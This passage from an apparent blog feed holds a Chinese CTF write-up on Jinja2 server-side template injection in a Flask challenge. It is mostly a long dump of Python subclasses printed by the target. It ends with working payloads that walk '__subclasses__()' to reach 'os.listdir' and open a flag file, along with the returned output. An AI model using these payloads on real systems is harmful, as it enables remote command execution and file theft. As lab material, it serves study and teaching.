class="string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
+
+<p>可以在其中找到 &lt;type ‘file’&gt;类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
+<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br></pre></td></tr></table></figure>
+
+<p>接下来构造读取flag payload</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ctf</span>&#123;f22b6844-<span class="number">5169</span>-<span class="number">4054</span>-b2a0-d95b9361cb57&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>CTF_Writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Writeup</tag>
+        <tag>攻防世界</tag>
         <tag>SSTI</tag>
       </tags>
   </entry>
